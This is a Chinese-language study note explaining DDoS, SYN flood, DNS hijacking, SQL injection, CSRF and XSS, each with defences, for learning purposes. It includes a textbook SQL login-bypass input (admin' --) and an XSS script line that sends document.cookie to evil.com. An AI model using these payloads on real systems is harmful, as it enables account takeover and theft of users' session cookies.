# 网络攻击

## 1. DDoS 攻击是什么？

DDoS 全称 Distributed Denial of Service，分布式拒绝服务攻击。最基本的 DOS 攻击过程如下：

1. 客户端向服务端发送请求链接数据包
2. 服务端向客户端发送确认数据包
3. 客户端不向服务端发送确认数据包，服务器一直等待来自客户端的确认

DDoS 则是采用分布式的方法，通过在网络上占领多台"肉鸡"，用多台计算机发起攻击。

DOS 攻击现在基本没啥作用了，因为服务器的性能都很好，而且是多台服务器共同作用，1V1 的模式黑客无法占上风。

**DDoS 的类型**：
- **流量型攻击**：用大量垃圾流量淹没带宽（如 UDP Flood、ICMP Flood）
- **协议型攻击**：利用协议漏洞消耗服务器资源（如 SYN Flood）
- **应用层攻击**：模拟正常请求但频率极高（如 HTTP Flood）

**对于 DDoS 攻击，预防方法有**：
- 减少 SYN timeout 时间。在握手的第三步，服务器会等待 30 秒-120 秒的时间，减少这个等待时间就能释放更多的资源
- 限制同时打开的 SYN 半连接数目

## 2. SYN 洪水攻击是什么？

SYN Flood 是最经典的 DDoS 攻击，利用了 TCP 三次握手的漏洞。

正常三次握手：
1. 客户端发 SYN → 服务器回 SYN+ACK → 等待客户端 ACK → 连接建立

SYN Flood：
1. 攻击者大量发送 SYN 包（伪造源 IP 地址）
2. 服务器回复 SYN+ACK，为每个连接分配资源（半连接队列）
3. 攻击者故意不回 ACK
4. 服务器的半连接队列很快被塞满，无法处理新的正常连接

**防御手段**：
- **SYN Cookie**：服务器不立即分配资源，而是用算法验证第三次握手的 ACK 是否合法
- **增大半连接队列**：提高服务器能承受的半连接数
- **缩短超时时间**：半连接等待时间缩短，尽快释放资源
- **防火墙过滤**：识别和过滤异常的 SYN 包

## 3. DNS 劫持是什么？

DNS 劫持就是攻击者篡改 DNS 解析结果，把域名指向错误的 IP 地址。

比如你输入 `www.bank.com`，正常应该去银行的服务器，但 DNS 被劫持后去了攻击者的服务器，你以为在登录银行，其实信息已经泄露了。

**常见的 DNS 劫持方式**：
- **篡改本地 hosts 文件**：在你的电脑上把域名指向恶意 IP
- **路由器 DNS 劫持**：篡改路由器的 DNS 设置
- **DNS 服务器被入侵**：直接修改 DNS 服务器的记录
- **中间人攻击**：在 DNS 查询过程中篡改响应

**防御**：
- 使用 HTTPS（即使 DNS 被劫持，证书不匹配浏览器会报警）
- 使用可信的 DNS 服务器（如 8.8.8.8、114.114.114.114）
- DNSSEC（DNS 安全扩展）：对 DNS 记录进行数字签名

## 4. SQL 注入是什么，如何避免 SQL 注入？

SQL 注入就是在用户输入的字符串中加入 SQL 语句，如果在设计不良的程序中忽略了检查，那么这些注入进去的 SQL 语句就会被数据库服务器误认为是正常的 SQL 语句而运行，攻击者就可以执行计划外的命令或访问未被授权的数据。

**SQL 注入的原理主要有以下 4 点**：
- 恶意拼接查询
- 利用注释执行非法命令
- 传入非法参数
- 添加额外条件

**例子**：
- 正常登录：用户名 `admin`，密码 `123456`
  - SQL：`SELECT * FROM users WHERE username='admin' AND password='123456'`
- 攻击输入：用户名 `admin' --`，密码随便填
  - SQL：`SELECT * FROM users WHERE username='admin' --' AND password='xxx'`
  - `--` 注释掉了后面的密码验证，攻击者直接以 admin 身份登录！

**避免 SQL 注入的一些方法**：
- 限制数据库权限，给用户提供仅仅能够满足其工作的最低权限
- 对进入数据库的特殊字符（`"` `\` 尖括号 `&*;` 等）转义处理
- 提供参数化查询接口，不要直接使用原生 SQL
- **WAF（Web 应用防火墙）**：检测和拦截恶意请求

## 5. CSRF 攻击是什么？

CSRF（跨站请求伪造）就是攻击者诱导你去点击一个链接，这个链接会**利用你已登录的身份**向目标网站发送请求。

**攻击场景**：
1. 你登录了银行网站 `bank.com`，浏览器保存了 Cookie
2. 你访问了恶意网站 `evil.com`
3. `evil.com` 的页面里藏了一个隐藏的表单，自动向 `bank.com/transfer` 发送转账请求
4. 浏览器会自动带上 `bank.com` 的 Cookie
5. 银行服务器以为是你本人操作，转账成功！

**防御手段**：
- **CSRF Token**：每次请求携带一个随机 Token，服务器验证 Token 的有效性
- **SameSite Cookie**：设置 Cookie 的 SameSite 属性，跨站时不携带 Cookie
- **验证 Referer/Origin**：检查请求来源是否合法
- **双重 Cookie 验证**：要求请求中包含一个 Cookie 中的值

## 6. XSS 攻击是什么？

XSS（跨站脚本攻击）就是攻击者把恶意 JavaScript 代码注入到网页中，当其他用户浏览时执行。

**三种类型**：
- **存储型**：恶意脚本存入数据库，所有访问该页面的用户都会中招（最危险）
- **反射型**：恶意脚本在 URL 中，服务器"反射"回给用户执行
- **DOM 型**：不经过服务器，直接在客户端修改 DOM 执行脚本

**例子**：
```
搜索框输入：<script>document.location='http://evil.com?c='+document.cookie</script>
如果服务器不过滤直接显示，所有搜索该关键词的用户 Cookie 都会被偷走
```

**防御手段**：
- **前端过滤**：前端对用户输入进行基本过滤
- **后端转义**：比如 Go 自带的处理器就具有转义功能，对输出到 HTML 的内容进行编码
- **CSP（内容安全策略）**：限制页面可以执行的脚本来源
- **HttpOnly Cookie**：JavaScript 无法读取 Cookie

---

## 7. 网络攻击防御总结

| 攻击类型 | 防御手段 |
|---------|---------|
| DDoS | CDN 流量清洗、限流、高防 IP |
| SYN Flood | SYN Cookie、增大半连接队列 |
| DNS 劫持 | HTTPS、可信 DNS、DNSSEC |
| SQL 注入 | 参数化查询、输入过滤 |
| CSRF | CSRF Token、SameSite Cookie |
| XSS | 输入过滤、输出编码、CSP |
